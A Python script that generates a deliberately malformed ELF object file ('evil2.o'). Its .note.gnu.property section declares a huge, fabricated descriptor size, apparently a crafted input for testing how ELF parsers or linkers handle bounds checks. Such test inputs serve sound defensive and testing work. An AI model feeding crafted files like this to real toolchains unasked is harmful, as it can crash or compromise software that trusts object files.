#!/usr/bin/env python3
# Variant: valid small n_namesz ("GNU\0" = 4 bytes) but a huge, fabricated n_descsz.
import struct
import sys


def build() -> bytes:
    e_ident = b"\x7fELF" + bytes([2, 1, 1, 0]) + b"\x00" * 8
    name_bytes = b"GNU\x00"  # namesz=4, aligned to 4 = 4
    note_data = struct.pack("<III", 4, 0x7FFFFFF0, 5) + name_bytes

    shstrtab = b"\x00.note.gnu.property\x00.shstrtab\x00"
    name_note = 1
    name_shstrtab = 1 + len(".note.gnu.property") + 1

    off_note = 64
    off_shstrtab = off_note + len(note_data)
    off_shdrs = off_shstrtab + len(shstrtab)
    pad = (-off_shdrs) % 8
    off_shdrs += pad

    ehdr = e_ident + struct.pack(
        "<HHIQQQIHHHHHH",
        1, 62, 1, 0, 0, off_shdrs, 0, 64, 0, 0, 64, 3, 2,
    )
    assert len(ehdr) == 64

    def shdr(name, type_, flags, offset, size):
        return struct.pack("<IIQQQQIIQQ", name, type_, flags, 0, offset, size, 0, 0, 1, 0)

    sh_null = shdr(0, 0, 0, 0, 0)
    sh_note = shdr(name_note, 7, 0, off_note, len(note_data))
    sh_shstrtab = shdr(name_shstrtab, 3, 0, off_shstrtab, len(shstrtab))

    return ehdr + note_data + shstrtab + b"\x00" * pad + sh_null + sh_note + sh_shstrtab


with open(sys.argv[1] if len(sys.argv) > 1 else "evil2.o", "wb") as f:
    f.write(build())
